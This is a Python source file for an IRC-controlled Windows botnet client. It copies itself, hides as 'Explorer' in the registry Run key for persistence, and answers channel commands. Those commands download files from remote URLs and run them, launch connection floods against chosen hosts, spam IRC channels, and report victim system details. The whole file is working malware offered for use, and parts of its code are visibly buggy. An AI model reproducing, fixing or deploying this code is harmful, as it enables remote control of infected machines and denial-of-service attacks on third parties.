import socket
import sys
import random
import urllib2
import subprocess
import os.path
import os
import threading
import platform
import shutil
from _winreg import *


#-----Settings---------  
server = "SERVER" 
channel = "CHANNEL"
keyword = "CHANNEL KEYWORD" 
nickprefix = "PREFIX FOR RANDOM NICK"
outfile = "PATH TO COPY ITSELF TOO"
#----------------------

#other stuff
ver = "0.1 Beta"
synkill = False

class Synflood(threading.Thread):
    def run(self):
        sendmsg(channel, "Starting syn flood to " + host + " on port " + str(port))
        while synkill == False:
            synsock = socket.socket()
            synsock.connect((host, port))
        return

class Download(threading.Thread):
    def run(self):
        afile = url.rsplit('/', 1)
        u = urllib2.urlopen(url)
        localFile = open(afile[1], 'w')
        localFile.write(u.read()) 
        localFile.close()
        sendmsg(channel, "Download of " + str(afile[1]) + " completed")

class Chanflood(threading.Thread):
    def run(self):
        chanfloodsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            chanfloodsock.connect((chanfloodserv, 6667))
        except socket.error:
            sendmsg(channel, "Server timed out or does not exist")
        else:
            sendmsg(channel, "Flooding " + chanfloodchan + " on " + chanfloodserv)
            chanfloodsock.send(str.encode("USER "+ botnick +" "+ botnick +" "+ botnick +" :hax\n"))
            chanfloodsock.send(str.encode("NICK "+ botnick +"\n"))
            chanfloodsock.send(str.encode("JOIN "+ chanfloodchan + " " + chanfloodkeyword + "\n"))
            while chanfloodkill == False:
                chanfloodsock.send(str.encode("PRIVMSG "+ chanfloodchan +" :" + msg + "\n") )
            return

class Infect(threading.Thread):
    def run(self):
        shutil.copy(sys.argv[0],outfile)
        aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"Explorer",0, REG_SZ, outfile)
        
def connect():
    try:
        ircsock.connect((server, 6667))
    except socket.error:
        print "timed out.. trying again.."
        connect()
    else:
        ircsock.send(str.encode("USER "+ botnick +" "+ botnick +" "+ botnick +" :hax\n"))
        ircsock.send(str.encode("NICK "+ botnick +"\n")) 

def ping():
    ircsock.send(str.encode("PONG :pingis\n"))

def sendmsg(chan , msg): 
  ircsock.send(str.encode("PRIVMSG " + chan +" :" + msg + "\n") )
  
def joinchan(chan): 
  ircsock.send(str.encode("JOIN " + chan + " " + keyword + "\n"))

def leavechan(chan):
  ircsock.send(str.encode("PART " + chan + " leaving the channel" + "\n"))

def quitirc(chan):
   chanfloodkill = True
   synfloodkill = True
   ircsock.send(str.encode("QUIT" + "\n"))

ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
botnick = nickprefix + str(random.randint(1,10000))
connect()
joinchan(channel)

if os.path.isfile(outfile) == False:
    Infect().start()
else:
    print "\nComputer is already infected"

while 1: 
  ircmsg = ircsock.recv(2048)
  ircmsg_clean = ircmsg.strip(str.encode('\n\r')) 
  print(ircmsg_clean) 

  if ircmsg.find(str.encode("Nickname is already in use")) != -1:
    botnick = nickprefix + str(random.randint(1,10000))
    ircsock.send(str.encode("NICK "+ botnick +"\n")) 
    joinchan(channel)

  if ircmsg.find(str.encode("PING :")) != -1: 
    ping()

  if ircmsg.find(str.encode("!leave")) != -1:
      leavechan(channel)

  if ircmsg.find(str.encode("!quit")) != -1:
      quitirc(channel)
      sys.exit() 

  if ircmsg.find(str.encode("!download")) != -1:
    try:
        parts = ircmsg_clean.split()
        url = parts[4]
    except IndexError:
        sendmsg(channel, "Invalid syntax, usage: !download <direct_link_to_file>")
    else:
        if __name__ == "__main__":
            Download().start()
                

  if ircmsg.find(str.encode("!run")) != -1:
    try:
        parts = ircmsg_clean.split()
        run = parts[4]
    except IndexError:
        sendmsg(channel, "Invalid syntax, usage: !run <filename>")
    else:
        if os.path.isfile(run) == True:
            subprocess.call(['start', run], shell=True)
            sendmsg(channel, run + " has been executed.")
        else:
            sendmsg(channel, run + " does not exist.")

  if ircmsg.find(str.encode("!syn")) != -1:
    try:
        parts = ircmsg_clean.split()
        host = parts[4]
        port = int(parts[5])
    except IndexError:
        sendmsg(channel, "Invalid syntax, usage: !syn <host> <port>")
    else:
        if __name__ == "__main__":
            synkill = False
            t = Synflood().start()

  if ircmsg.find(str.encode("!stopsyn")) !=-1:
    synkill = True
        sendmsg(channel, "Flood stoped")

  if ircmsg.find(str.encode("!info")) !=-1:
    iall = "all"
    try:
        parts = ircmsg_clean.split()
        inick = parts[4]
    except IndexError:
        sendmsg(channel, "Invalid syntax, usage: !info <botname> or !info all to view info on all bots.")
    else:
        if inick == botnick or inick == iall:
            os = platform.system()
            name = platform.node()
            proc = platform.processor()
            info = "OS: " + os + ", Name: " + name + ", Processor: " + proc
            sendmsg(channel, info)
        

  if ircmsg.find(str.encode("!moreinfo")) !=-1:
    miall = "all"
    try:
        parts = ircmsg_clean.split()
        inick = parts[4]
    except IndexError:
        sendmsg(channel, "Invalid syntax, usage: !moreinfo <botname> or !moreinfo all to view detailed info on all bots.")
    else:
        if inick == botnick or inick == miall:
            minfo = platform.uname()
            sendmsg(channel, str(minfo))
        else:
            sendmsg(channel, inick + " does not exist in channel.")

  if ircmsg.find(str.encode("!chanflood")) !=-1:
    try:
        parts = ircmsg_clean.split()
        chanfloodserv = parts[4]
        chanfloodchan = parts[5]
        chanfloodkeyword = parts[6]
        sg = ircmsg_clean.rsplit("-m")
        msg = sg[1]
    except IndexError:
        sendmsg(channel, "Invalid Syntax, usage: !chanflood <server> <chan> <chankeyword> -m <message>")
    else:
        chanfloodkill = False
        sendmsg(channel, "SERVER: " + chanfloodserv + " | CHANNEL: " + chanfloodchan + " | Keyword: " + chanfloodkeyword + " | MESSAGE: " + msg)
        Chanflood().start()

  if ircmsg.find(str.encode("!stopchanflood")) !=-1:
    chanfloodkill = True
    sendmsg(channel, "Stoping flood.")
    
  if ircmsg.find(str.encode("!name")) !=-1:
    sendmsg(channel, "My name is: " + sys.argv[0])

  if ircmsg.find(str.encode("!version")) !=-1:
    sendmsg(channel, ver)